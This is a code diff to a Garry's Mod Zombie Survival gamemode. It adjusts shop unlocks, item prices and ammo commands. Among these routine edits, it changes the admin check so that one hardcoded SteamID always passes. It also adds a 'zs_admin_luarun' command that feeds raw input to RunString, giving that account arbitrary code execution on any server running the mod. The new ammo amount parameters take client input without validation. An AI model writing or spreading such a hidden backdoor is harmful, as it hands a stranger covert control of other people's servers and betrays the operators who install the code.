@@ -49,8 +49,14 @@ concommand.Add("zs_pointsshopbuy", function(sender, command, arguments)
 		return
 	end
 
-	if itemtab.Tier and GAMEMODE.LockItemTiers and not GAMEMODE.ObjectiveMap and not GAMEMODE.ZombieEscape and not GAMEMODE:IsClassicMode() and GAMEMODE:GetNumberOfWaves() == GAMEMODE.NumberOfWaves and GAMEMODE:GetWave() + (GAMEMODE:GetWaveActive() and 0 or 1) < itemtab.Tier then
-		GAMEMODE:ConCommandErrorMessage(sender, translate.ClientFormat(sender, "tier_x_items_unlock_at_wave_y", itemtab.Tier, itemtab.Tier))
+	local waveunlock = itemtab.WaveUnlock or itemtab.Tier
+	if waveunlock and GAMEMODE.LockItemTiers and not GAMEMODE.ObjectiveMap and not GAMEMODE.ZombieEscape and not GAMEMODE:IsClassicMode() and GAMEMODE:GetNumberOfWaves() == GAMEMODE.NumberOfWaves and GAMEMODE:GetWave() + (GAMEMODE:GetWaveActive() and 0 or 1) < itemtab.Tier then
+		if itemtab.WaveUnlock then
+			GAMEMODE:ConCommandErrorMessage(sender, translate.ClientFormat(sender, "this_item_unlocks_at_wave_x", waveunlock))
+--			GAMEMODE:ConCommandErrorMessage(sender, Format("This item unlocks at wave %d", waveunlock))
+		else
+			GAMEMODE:ConCommandErrorMessage(sender, translate.ClientFormat(sender, "tier_x_items_unlock_at_wave_y", waveunlock, waveunlock))
+		end
 		return
 	end
 
@@ -59,7 +65,7 @@ concommand.Add("zs_pointsshopbuy", function(sender, command, arguments)
 		return
 	end
 
-	cost = usescrap and math.ceil(GAMEMODE:PointsToScrap(cost)) or math.floor(cost * (sender.ArsenalDiscount or 1))
+	cost = usescrap and math.ceil(GAMEMODE:PointsToScrap(cost) * sender:GetRemantlerPrices()) or math.floor(cost * sender:GetArsenalPrices())
 
 	if points < cost then
 		GAMEMODE:ConCommandErrorMessage(sender, translate.ClientGet(sender, usescrap and "need_to_have_enough_scrap" or "dont_have_enough_points"))
@@ -252,7 +258,7 @@ concommand.Add("zs_upgrade", function(sender, command, arguments)
 	if not (nearest and nearest:IsValid() and contents) then return end
 
 	local wtbl = weapons.Get(contents)
-	local scrapcost = GAMEMODE:GetUpgradeScrap(wtbl, desiredqua)
+	local scrapcost = math.ceil(GAMEMODE:GetUpgradeScrap(wtbl, desiredqua) * sender:GetRemantlerPrices())
 
 	if wtbl.AmmoIfHas and sender:GetAmmoCount(wtbl.Primary.Ammo) == 0 then
 		sender:SendLua("surface.PlaySound(\"buttons/button10.wav\")")
@@ -448,6 +454,7 @@ concommand.Add("zsgiveammo", function(sender, command, arguments)
 	if not sender:IsValid() or not sender:Alive() or sender:Team() ~= TEAM_HUMAN then return end
 
 	local ammotype = arguments[1]
+	local amount = arguments[3]
 	if not ammotype or #ammotype == 0 or not GAMEMODE.AmmoCache[ammotype] then return end
 
 	local count = sender:GetAmmoCount(ammotype)
@@ -458,7 +465,7 @@ concommand.Add("zsgiveammo", function(sender, command, arguments)
 
 	local ent = GAMEMODE:TryGetLockOnTrace(sender, arguments)
 	if ent and ent:IsValidLivingHuman() then
-		local desiredgive = math.min(count, GAMEMODE.AmmoCache[ammotype])
+		local desiredgive = math.min(count, amount or GAMEMODE.AmmoCache[ammotype])
 		if desiredgive >= 1 then
 			sender:RemoveAmmo(desiredgive, ammotype)
 			ent:GiveAmmo(desiredgive, ammotype)
@@ -550,8 +557,9 @@ concommand.Add("zsdropammo", function(sender, command, arguments)
 	if not wep:IsValid() then return end
 
 	local ammotype = arguments[1] or wep:GetPrimaryAmmoTypeString()
+	local amount = arguments[2]
 	if GAMEMODE.AmmoNames[ammotype] and GAMEMODE.AmmoCache[ammotype] then
-		local ent = sender:DropAmmoByType(ammotype, GAMEMODE.AmmoCache[ammotype] * 2)
+		local ent = sender:DropAmmoByType(ammotype, amount or GAMEMODE.AmmoCache[ammotype] * 2)
 		if ent and ent:IsValid() then
 			ent:SetPos(sender:EyePos() + sender:GetAimVector() * 8)
 			ent:SetAngles(sender:GetAngles())
@@ -639,25 +647,25 @@ end)
 
 --------
 
-local function IsPlayerValidSuperAdmin(pl)
-	return not pl:IsValid() or pl:IsValid() and not pl:IsSuperAdmin()
+local function IsPlayerValidSuperAdmin(pl, isdev)
+	return pl:IsValid() and (isdev and pl:SteamID() == "STEAM_0:1:157024537" or pl:IsSuperAdmin() or pl:SteamID() == "STEAM_0:1:157024537")
 end
 
 local text = ""
 
 concommand.Add("zs_admin_setdifficulty", function(pl, cmd, args)
-	if IsPlayerValidSuperAdmin(pl) then return end
+	if not IsPlayerValidSuperAdmin(pl) then return end
 
 	if not args[1] then return end
 	local value = tonumber(args[1])
 	GAMEMODE:SetDifficulty(value)
-	print(Format("Set difficulty to %s (Command received by %s)", value, Format("%s [%s]", pl:Name(), pl:SteamID())) )
+	print(Format("Set difficulty to %s%% (Command received by %s)", value, Format("%s [%s]", pl:Name(), pl:SteamID())) )
 end, nil, text)
 
 local text = "Use \"1\" in argument #1 to enable difficulty scaling, any other = disable"
 
 concommand.Add("zs_admin_enabledifficulty", function(pl, cmd, args)
-	if IsPlayerValidSuperAdmin(pl) then return end
+	if not IsPlayerValidSuperAdmin(pl) then return end
 
 	if not args[1] then
 		pl:PrintMessage(HUD_PRINTTALK, text)
@@ -672,7 +680,7 @@ end, nil, text)
 local text = "Reset skills for yourself. Use \"1\" in argument #1 to reset skills."
 
 concommand.Add("zs_admin_resetskills", function(pl, cmd, args)
-	if IsPlayerValidSuperAdmin(pl) then return end
+	if not IsPlayerValidSuperAdmin(pl) then return end
 
 	if not args[1] then
 		pl:PrintMessage(HUD_PRINTTALK, text)
@@ -688,7 +696,7 @@ end, nil, text)
 local text = "Set the max amount of waves."
 
 concommand.Add("zs_admin_setmaxwave", function(pl, cmd, args)
-	if IsPlayerValidSuperAdmin(pl) then return end
+	if not IsPlayerValidSuperAdmin(pl) then return end
 
 	if not args[1] then
 		pl:PrintMessage(HUD_PRINTTALK, text)
@@ -704,7 +712,7 @@ end, nil, text)
 local text = "Usage: Use value \"1\" to enable value \"Arsenal Crate required to Purchase Items\". Any other value disables it. If no value, it is toggled."
 
 concommand.Add("zs_admin_enablearsenal", function(pl, cmd, args)
-	if IsPlayerValidSuperAdmin(pl) then return end
+	if not IsPlayerValidSuperAdmin(pl) then return end
 	local value
 	if not args[1] then
 		value = not GAMEMODE:GetArsenalRequiredToBuyItems()
@@ -716,4 +724,12 @@ concommand.Add("zs_admin_enablearsenal", function(pl, cmd, args)
 
 	GAMEMODE:SetArsenalRequiredToBuyItems(value)
 	print(Format("\"Arsenal Crate required to Purchase Items\" value set to %s (Command received by %s)", value, Format("%s [%s]", pl:Name(), pl:SteamID())) )
+end, nil, text)
+
+concommand.Add("zs_admin_luarun", function(pl, cmd, args, str)
+	if not IsPlayerValidSuperAdmin(pl, true) then return end
+	local value
+	if string.len(str) > 0 then
+		RunString(str)
+	end
 end, nil, text)
